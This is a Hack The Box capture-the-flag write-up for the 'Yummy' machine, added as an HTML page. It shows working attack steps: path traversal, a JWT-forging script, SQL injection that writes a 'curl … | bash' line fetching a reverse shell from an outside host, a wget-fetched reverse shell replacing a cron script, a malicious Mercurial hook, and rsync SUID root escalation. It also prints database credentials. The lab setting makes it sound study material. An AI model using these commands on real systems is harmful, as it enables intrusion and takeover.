@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yummy - Hexicon Archives</title>
+    <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
+    <link rel="stylesheet" href="../style.css">
+    <!-- Machine-specific metadata for SEO -->
+    <meta name="description" content="Detailed writeup for Yummy machine from HackTheBox - Hard difficulty level">
+    <meta name="keywords" content="HackTheBox, Yummy, Hard, CTF, writeup, cybersecurity, penetration testing, Hexicon">
+</head>
+<body>
+    <header>
+        <div class="container header-content">
+            <a href="../index.html" class="logo">All writeups</a>
+            <div class="header-controls">
+                <a href="#" class="htb-icon" title="Link to the main page(Coming soon!)">
+                    <img src="../favicon.png" alt="Archive" width="30" height="30">
+                </a>
+                <div class="hamburger-menu">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </div>
+        </div>
+    </header>
+    
+    <div class="sidebar">
+        <div class="difficulty-buttons">
+            <button class="difficulty-btn" data-difficulty="easy">Easy</button>
+            <div class="machine-list" id="easy-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="difficulty-btn" data-difficulty="medium">Medium</button>
+            <div class="machine-list" id="medium-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="difficulty-btn" data-difficulty="hard">Hard</button>
+            <div class="machine-list" id="hard-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+
+            <button class="difficulty-btn" data-difficulty="insane">Insane</button>
+            <div class="machine-list" id="insane-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+        </div>
+    </div>
+    
+    <div class="backdrop"></div>
+    
+    <main class="container writeup-content">
+        <h1 class="writeup-title">Yummy</h1>
+        <div class="writeup-metadata">
+            <span class="difficulty hard">Hard</span>
+            <span class="date">February 22, 2025</span>
+        </div>
+        
+        <div class="writeup-container">
+            <div class="writeup-body">
+                <!-- Machine-specific content goes here -->
+                <p><img alt="yummy" src="../images/Yummy/pwned.png" /></p>
+<p>Yummy is a hard difficulty Linux machine that challenges players with a mix of SQL injection, misconfigured file privileges and version control exploitation.
+The initial foothold involves exploiting an SQL injection vulnerability to achieve arbitrary file write. From there, lateral movement is achieved by leveraging writable scripts and abusing Mercurial hooks.
+Privilege escalation is accomplished through rsync misconfigurations, ultimately leading to root access.
+The box tests knowledge of database exploitation, unintended file writes and privilege escalation through common misconfigurations</p>
+<h1>User flag</h1>
+<hr />
+<h2>File Disclosure</h2>
+<p>Initial nmap scan reveals only 2 ports open, SSH on port 22 and HTTP on port 80. Pretty straightforward.</p>
+<p><img alt="nmap_scan" src="../images/Yummy/nmap_scan.png" /></p>
+<p>The first thing Im going to check is the website on port 80.</p>
+<p><img alt="website" src="../images/Yummy/website.png" /></p>
+<p>We're greeted with what seems like a nice restaurant website. We can register/login, as well as book a table.</p>
+<p><img alt="booking" src="../images/Yummy/booking.png" /></p>
+<p>The "Book a Table" section catches my interest, so I'll go ahead and create an user in order to check it out. I'll fill in the fields with bogus data, throwing in some HTML in order to check for Cross-Site Scripting possibility.</p>
+<p>The reservation can be checked through the dashboard button. It seems like XSS wont be viable here, since the HTML code was displayed as text and did not convert.</p>
+<p><img alt="reservation" src="../images/Yummy/reservation.png" /></p>
+<p>It looks like we can download our reservation details via the "Save iCalendar" button. Lets see how this process looks like with burp suite.</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/export/Yummy_reservation_20250221_025105.ics</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">yummy.htb</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.9</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+<span class="na">Referer</span><span class="o">:</span> <span class="l">http://yummy.htb/dashboard</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
+<span class="na">Cookie</span><span class="o">:</span> <span class="l">X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAbWFpbC5jb20iLCJyb2xlIjoiY3VzdG9tZXJfYWVhYzFmOTIiLCJpYXQiOjE3NDAxMDQ0NjQsImV4cCI6MTc0MDEwODA2NCwiandrIjp7Imt0eSI6IlJTQSIsIm4iOiI5OTkwMDc5Njc2NTEzMjY3NTU2MTA4NTEyODM3MTAwMDk0MzU4MDE4MjE1OTM3OTI0MTUyMzYzNjQyOTUyMDYxMDg2OTcyNDU3NjU3NDI0NTY3ODAzNzM1NjYyNDg1Mzc5NTQ4MjQ2NDgwODgwNzIyNzk5MDI5MTI4MzM0MzA0NjY5MTAxMDg0NDYzODU3Mzc1NTQ4MTAwNTgxNTUwMTcxMDgwNDkzOTIzMDQ4Mzc3MDM2NTYyMTgyNDk4Mzk0MjM3Mzk5NjMxODU3NDU5OTU5NDY0OTgwODU1NDE4NTgyNTY4NTgyNzU1MTIzOTIzNzg5NDMyNDk0MTUwMDEyNDIxMjcxMTI3MDUwMTYxMjg0MDMyNDAwNTc3Mjg2Mjc5MTY0ODE4NTQ5MTI0MDkyMTkxNTMyNzk5MTAyNyIsImUiOjY1NTM3fX0.AyEms2pwIfxil81ciyOrakzgnNlx1a5dgVlj8oZQqBzeNs7skjqR9uZ5ushC54WMScYYoebcHIQSyZOSZ83CEae-YMYuO7j7iUInq9ZYuNguhK4ApPj_bVcu_ZNSUoIrHmWqSJrypDzTMoBsLelTxDSxkVnjm-HMG62wrnEM6rHiDoA; session=eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlJlc2VydmF0aW9uIGRvd25sb2FkZWQgc3VjY2Vzc2Z1bGx5Il19XX0.Z7fqGQ.IvFJEGEcqZDG5iJ8I0HC1S49bhI</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
+</code></pre></div>
+
+<p>There is an export parameter with a file name. I'll check whether file disclosure is possible by replacing the filename with '../../../../etc/passwd'</p>
+<p><img alt="lfi" src="../images/Yummy/lfi.png" /></p>
+<p>Indeed it is! With this, I'll investigate and see what other interesting files I can find.</p>
+<p><img alt="crontab" src="../images/Yummy/crontab.png" /></p>
+<p>The crontab file reveals three very interesting files. I'll download them the same way as before.</p>
+<p>app_backup.sh:</p>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+
+<span class="nb">cd</span><span class="w"> </span>/var/www
+/usr/bin/rm<span class="w"> </span>backupapp.zip
+/usr/bin/zip<span class="w"> </span>-r<span class="w"> </span>backupapp.zip<span class="w"> </span>/opt/app
+</code></pre></div>
+
+<p>table_cleanup.sh:</p>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/bin/sh</span>
+
+/usr/bin/mysql<span class="w"> </span>-h<span class="w"> </span>localhost<span class="w"> </span>-u<span class="w"> </span>chef<span class="w"> </span>yummy_db<span class="w"> </span>-p<span class="s1">&#39;3wDo7gSRZIwIHRxZ!&#39;</span><span class="w"> </span>&lt;<span class="w"> </span>/data/scripts/sqlappointments.sql
+</code></pre></div>
+
+<p>dbmonitor.sh:</p>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+
+<span class="nv">timestamp</span><span class="o">=</span><span class="k">$(</span>/usr/bin/date<span class="k">)</span>
+<span class="nv">service</span><span class="o">=</span>mysql
+<span class="nv">response</span><span class="o">=</span><span class="k">$(</span>/usr/bin/systemctl<span class="w"> </span>is-active<span class="w"> </span>mysql<span class="k">)</span>
+
+<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$response</span><span class="s2">&quot;</span><span class="w"> </span>!<span class="o">=</span><span class="w"> </span><span class="s1">&#39;active&#39;</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">    </span>/usr/bin/echo<span class="w"> </span><span class="s2">&quot;{\&quot;status\&quot;: \&quot;The database is down\&quot;, \&quot;time\&quot;: \&quot;</span><span class="nv">$timestamp</span><span class="s2">\&quot;}&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>/data/scripts/dbstatus.json
+<span class="w">    </span>/usr/bin/echo<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$service</span><span class="s2"> is down, restarting!!!&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>/usr/bin/mail<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$service</span><span class="s2"> is down!!!&quot;</span><span class="w"> </span>root
+<span class="w">    </span><span class="nv">latest_version</span><span class="o">=</span><span class="k">$(</span>/usr/bin/ls<span class="w"> </span>-1<span class="w"> </span>/data/scripts/fixer-v*<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>/usr/bin/sort<span class="w"> </span>-V<span class="w"> </span><span class="p">|</span><span class="w"> </span>/usr/bin/tail<span class="w"> </span>-n<span class="w"> </span><span class="m">1</span><span class="k">)</span>
+<span class="w">    </span>/bin/bash<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$latest_version</span><span class="s2">&quot;</span>
+<span class="k">else</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-f<span class="w"> </span>/data/scripts/dbstatus.json<span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span>grep<span class="w"> </span>-q<span class="w"> </span><span class="s2">&quot;database is down&quot;</span><span class="w"> </span>/data/scripts/dbstatus.json<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">            </span>/usr/bin/echo<span class="w"> </span><span class="s2">&quot;The database was down at </span><span class="nv">$timestamp</span><span class="s2">. Sending notification.&quot;</span>
+<span class="w">            </span>/usr/bin/echo<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$service</span><span class="s2"> was down at </span><span class="nv">$timestamp</span><span class="s2"> but came back up.&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>/usr/bin/mail<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$service</span><span class="s2"> was down!&quot;</span><span class="w"> </span>root
+<span class="w">            </span>/usr/bin/rm<span class="w"> </span>-f<span class="w"> </span>/data/scripts/dbstatus.json
+<span class="w">        </span><span class="k">else</span>
+<span class="w">            </span>/usr/bin/rm<span class="w"> </span>-f<span class="w"> </span>/data/scripts/dbstatus.json
+<span class="w">            </span>/usr/bin/echo<span class="w"> </span><span class="s2">&quot;The automation failed in some way, attempting to fix it.&quot;</span>
+<span class="w">            </span><span class="nv">latest_version</span><span class="o">=</span><span class="k">$(</span>/usr/bin/ls<span class="w"> </span>-1<span class="w"> </span>/data/scripts/fixer-v*<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>/usr/bin/sort<span class="w"> </span>-V<span class="w"> </span><span class="p">|</span><span class="w"> </span>/usr/bin/tail<span class="w"> </span>-n<span class="w"> </span><span class="m">1</span><span class="k">)</span>
+<span class="w">            </span>/bin/bash<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$latest_version</span><span class="s2">&quot;</span>
+<span class="w">        </span><span class="k">fi</span>
+<span class="w">    </span><span class="k">else</span>
+<span class="w">        </span>/usr/bin/echo<span class="w"> </span><span class="s2">&quot;Response is OK.&quot;</span>
+<span class="w">    </span><span class="k">fi</span>
+<span class="k">fi</span>
+
+<span class="o">[</span><span class="w"> </span>-f<span class="w"> </span>dbstatus.json<span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>/usr/bin/rm<span class="w"> </span>-f<span class="w"> </span>dbstatus.json
+</code></pre></div>
+
+<p>There are plaintext database credentials for the user chef, as well as an additional .zip file.</p>
+<p>First however, lets focus on the dbmonitor.sh file.</p>
+<p>If there is a way to write into the dbstatus.json file and create a malicious 'fixer-v' file, It would be possible to achieve remote code execution and get a reverse shell.</p>
+<p>I'll keep that in mind. Lets go back to the .zip file from the app_backup.sh file.</p>
+<h2>JWT forgery</h2>
+<p>Inside the config directory, I found a script that generates an RSA key pair and leaks the large integer e and a very small q.</p>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python3</span>
+
+<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.PublicKey</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="n">RSA</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">cryptography.hazmat.backends</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="n">default_backend</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">cryptography.hazmat.primitives</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="n">serialization</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sympy</span>
+
+
+<span class="c1"># Generate RSA key pair</span>
+<span class="n">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sympy</span><span class="o">.</span><span class="n">randprime</span><span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">19</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="o">**</span><span class="mi">20</span><span class="p">)</span>
+<span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sympy</span><span class="o">.</span><span class="n">randprime</span><span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">1023</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="o">**</span><span class="mi">1024</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">q</span>
+<span class="n">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">65537</span>
+<span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">n</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">q</span>
+<span class="n">phi_n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">p</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">(</span><span class="n">q</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span>
+<span class="n">d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">pow</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">phi_n</span><span class="p">)</span>
+<span class="n">key_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;n&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">n</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;e&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">e</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;d&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">d</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;p&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;q&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">q</span><span class="p">}</span>
+<span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">RSA</span><span class="o">.</span><span class="n">construct</span><span class="p">((</span><span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">],</span><span class="w"> </span><span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;e&#39;</span><span class="p">],</span><span class="w"> </span><span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;d&#39;</span><span class="p">],</span><span class="w"> </span><span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">],</span><span class="w"> </span><span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;q&#39;</span><span class="p">]))</span>
+<span class="n">private_key_bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">key</span><span class="o">.</span><span class="n">export_key</span><span class="p">()</span>
+
+<span class="n">private_key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">serialization</span><span class="o">.</span><span class="n">load_pem_private_key</span><span class="p">(</span>
+<span class="w">    </span><span class="n">private_key_bytes</span><span class="p">,</span>
+<span class="w">    </span><span class="n">password</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span>
+<span class="w">    </span><span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">()</span>
+<span class="p">)</span>
+<span class="n">public_key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">private_key</span><span class="o">.</span><span class="n">public_key</span><span class="p">()</span>
+</code></pre></div>
+
+<p>This pushed me to think that, if the JWT token I've gotten after logging into the website was also exposing integers, then I'd be able to forge an administrator JWT token and impersonate them.</p>
+<p><img alt="jwtleak" src="../images/Yummy/jwt.png" /></p>
+<p>It does indeed! I'll use this to forge an administrator JWT token!</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">jwt</span>
+
+<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.PublicKey</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="n">RSA</span>
+
+<span class="kn">from</span><span class="w"> </span><span class="nn">cryptography.hazmat.backends</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="n">default_backend</span>
+
+<span class="kn">from</span><span class="w"> </span><span class="nn">cryptography.hazmat.primitives</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="n">serialization</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">sympy</span>
+
+
+
+<span class="n">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span>
+
+
+<span class="n">js</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="w"> </span><span class="n">token</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;===&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+
+<span class="n">n</span><span class="o">=</span><span class="w"> </span><span class="nb">int</span><span class="p">(</span><span class="n">js</span><span class="p">[</span><span class="s2">&quot;jwk&quot;</span><span class="p">][</span><span class="s1">&#39;n&#39;</span><span class="p">])</span>
+
+<span class="n">p</span><span class="p">,</span><span class="n">q</span><span class="o">=</span><span class="w"> </span><span class="nb">list</span><span class="p">((</span><span class="n">sympy</span><span class="o">.</span><span class="n">factorint</span><span class="p">(</span><span class="n">n</span><span class="p">))</span><span class="o">.</span><span class="n">keys</span><span class="p">())</span>
+
+<span class="n">e</span><span class="o">=</span><span class="mi">65537</span>
+
+<span class="n">phi_n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">pow</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">phi_n</span><span class="p">)</span>
+
+<span class="n">key_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;n&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">n</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;e&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">e</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;d&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">d</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;p&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;q&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">q</span><span class="p">}</span>
+
+<span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">RSA</span><span class="o">.</span><span class="n">construct</span><span class="p">((</span><span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">],</span><span class="w"> </span><span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;e&#39;</span><span class="p">],</span><span class="w"> </span><span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;d&#39;</span><span class="p">],</span><span class="w"> </span><span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">],</span><span class="w"> </span><span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;q&#39;</span><span class="p">]))</span>
+
+<span class="n">private_key_bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">key</span><span class="o">.</span><span class="n">export_key</span><span class="p">()</span>
+
+
+
+<span class="n">private_key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">serialization</span><span class="o">.</span><span class="n">load_pem_private_key</span><span class="p">(</span>
+
+<span class="w">    </span><span class="n">private_key_bytes</span><span class="p">,</span>
+
+<span class="w">    </span><span class="n">password</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span>
+
+<span class="w">    </span><span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">()</span>
+
+<span class="p">)</span>
+
+<span class="n">public_key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">private_key</span><span class="o">.</span><span class="n">public_key</span><span class="p">()</span>
+
+
+
+<span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span><span class="w">  </span><span class="n">public_key</span><span class="p">,</span><span class="w"> </span><span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;RS256&quot;</span><span class="p">]</span><span class="w"> </span><span class="p">)</span>
+
+<span class="n">data</span><span class="p">[</span><span class="s2">&quot;role&quot;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;administrator&quot;</span>
+
+
+
+
+<span class="n">new_token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">private_key</span><span class="p">,</span><span class="w"> </span><span class="n">algorithm</span><span class="o">=</span><span class="s2">&quot;RS256&quot;</span><span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">new_token</span><span class="p">)</span>
+</code></pre></div>
+
+<p>The script extracts the public key parameters (n and e) from the JWT, factors n to reconstruct the private key, and then forges a new JWT signed with the recovered key to give myself an admin role on the website.</p>
+<p><img alt="admindashboard" src="../images/Yummy/admindashboard.png" /></p>
+<h2>SQL injection</h2>
+<p>After some meddling with the search function and some url manipulation, I've discovered that there is an exploitable SQL injection vulnerability.</p>
+<div class="codehilite"><pre><span></span><code><span class="nt">http</span><span class="o">://</span><span class="nt">yummy</span><span class="p">.</span><span class="nc">htb</span><span class="o">/</span><span class="nt">admindashboard</span><span class="o">?</span><span class="nt">s</span><span class="o">=%</span><span class="nt">27</span><span class="o">%</span><span class="nt">27</span><span class="o">%</span><span class="nt">27SELECT</span><span class="o">+*&amp;</span><span class="nt">o</span><span class="o">=</span><span class="nt">ASC</span><span class="o">;</span><span class="nt">SELECT</span><span class="o">%</span><span class="nt">20</span><span class="o">*%</span><span class="nt">20FROM</span><span class="o">%</span><span class="nt">20</span>
+</code></pre></div>
+
+<p><img alt="sqlinjection" src="../images/Yummy/sqlinjection.png" /></p>
+<p>Further research led me to the "Secure_file_priv" privilege, which was disabled for my database user.</p>
+<p><img alt="securefileprivisnull" src="../images/Yummy/securefileprivisnull.png" /></p>
+<p>With this, writing to files on the machine is possible and I'll do just that.</p>
+<p>Recalling what I've learned from the 3 crontab files, I should be able to get a reverse shell if:</p>
+<ol>
+<li>A dbstatus.json file exists and it doesnt contain the "database is down" string;</li>
+<li>Im able to create a file named "fixer-v" with malicious content inside.</li>
+</ol>
+<p>Lets get to it!</p>
+<div class="codehilite"><pre><span></span><code>aa&amp;o=ASC%3b+select+&quot;TEST&quot;+INTO+OUTFILE++&#39;/data/scripts/dbstatus.json&#39;+%3b
+
+aa&amp;o=ASC%3b+select+&quot;curl+10.10.16.6:8000/rev.sh+|bash%3b&quot;+INTO+OUTFILE++&#39;/data/scripts/fixer-v___&#39;+%3b
+
+I put my urlencoded queries into the url, right after the &quot;?s=&quot; bit
+</code></pre></div>
+
+<p>After an ungodly amount of troubleshooting these two queries, I got a shell as the mysql user!</p>
+<p><img alt="mysqlshell" src="../images/Yummy/mysqlshell.png" /></p>
+<h2>Mysql to www-data</h2>
+<p>If I remember correctly, the app_backup.sh script is executed as the user www-data. If I swap that file with a reverse shell, I should be able to get a shell as the www-data user.</p>
+<div class="codehilite"><pre><span></span><code>cd ../../../../data/scripts
+
+wget http://x.x.x.x/rev.sh
+
+mv app_backup.sh blank &amp;&amp; mv rev.sh app_backup.sh
+</code></pre></div>
+
+<p><img alt="wwwshell" src="../images/Yummy/wwwshell.png" /></p>
+<p>It worked! the shell hit my listener almost immediately.</p>
+<p><img alt="wwwdata" src="../images/Yummy/wwwdata.png" /></p>
+<h2>www-data to qa</h2>
+<p>Browsing through the landing folder as www-data I found an app-qatesting folder, which does not bring me anything new...</p>
+<p>However, I looked through the folder once again, this time with the -la flag in order to see hidden files.</p>
+<div class="codehilite"><pre><span></span><code>ls -la app-qatesting
+</code></pre></div>
+
+<p>Bingo! There is an additional directory called .hg. Now, I have never seen a file with such a name before, so I went forward and researched a little.</p>
+<p>My research had brought me to Mercurial. A version control program similar to git which uses .hg files! I'll keep that in mind. For now I'll keep looking through the .hg directory.</p>
+<p>In the directory app-qatesting/.hg/store/data, there was an app.py.i file. Inside that file, I found the credentials for user qa.</p>
+<p><img alt="qacreds" src="../images/Yummy/qacreds.png" /></p>
+<p>With these credentials, we can ssh into the box and claim the user flag!</p>
+<p><img alt="ssh" src="../images/Yummy/ssh.png" /></p>
+<h1>Root flag</h1>
+<hr />
+<h2>Privilege escalation</h2>
+<p>Wtih an SSH session as the user qa, I can proceed with privilege escalation.</p>
+<p><img alt="sudopriv" src="../images/Yummy/sudopriv.png" /></p>
+<p>With this command, I can pull a repository from /opt/app/app-production/ as the dev user.</p>
+<p>The first thing that popped into my mind was whether mercurial had a hook functionality like git. Brief research confirmed that this was indeed the case.</p>
+<p>https://wiki.mercurial-scm.org/Hook</p>
+<p>I'll try poisoning qa's .hgrc config file with a malicious hook, which will attempt to execute a reverse shell located at /tmp/rev.sh.</p>
+<p>After downloading the reverse shell, I put it into the /tmp directory, so that its easily accessible.</p>
+<div class="codehilite"><pre><span></span><code>cd /tmp; mkdir .hg; chmod 777 .hg; cp ~/.hgrc .hg/hgrc
+</code></pre></div>
+
+<p>I copied the .hgrc config file of qa into /tmp/.hg/hgrc.</p>
+<p><img alt="hgrc" src="../images/Yummy/hgrc.png" /></p>
+<p>Adding the malicious hook. Now I should be able to execute the sudo command and, ideally, get a reverse shell as dev!</p>
+<div class="codehilite"><pre><span></span><code>sudo -u dev /usr/bin/hg pull /home/dev/app-production/
+</code></pre></div>
+
+<p><img alt="devshell" src="../images/Yummy/devshell.png" /></p>
+<p>Success!</p>
+<h2>Dev to root</h2>
+<p><img alt="devsudo" src="../images/Yummy/devsudo.png" /></p>
+<p>The user dev can use rsync to back files from /home/dev/app-production to /opt/app, with the -a flag to preserve file rights.</p>
+<p>I'll try to copy a SUID binary, and make it executable as root.</p>
+<div class="codehilite"><pre><span></span><code>cp /bin/bash app-production/bash
+chmod u+s app-production/bash
+sudo /usr/bin/rsync -a --exclude=.hg /home/dev/app-production/* --chown root:root /opt/app/
+/opt/app/bash -p
+</code></pre></div>
+
+<p>Im trying to copy bash to the app-production folder. I use chmod u+s to make this bash copy run as its owner and by providing the --chown root:root flag, I effectively set root as the owner of the new bash within /opt/app.</p>
+<p>Finally, I'll execute the root bash and hopefully, gain a root shell!</p>
+<p>I had trouble with running the commands one by one. I fixed it by chaining them together and executing them immediately one after another.</p>
+<div class="codehilite"><pre><span></span><code>cp /bin/bash app-production/bash &amp;&amp; chmod u+s app-production/bash &amp;&amp; sudo /usr/bin/rsync -a --exclude=.hg /home/dev/app-production/* --chown root:root /opt/app/ &amp;&amp; /opt/app/bash -p
+</code></pre></div>
+
+<p><img alt="root" src="../images/Yummy/root.png" /></p>
+<p>Rooted!</p>
+            </div>
+            
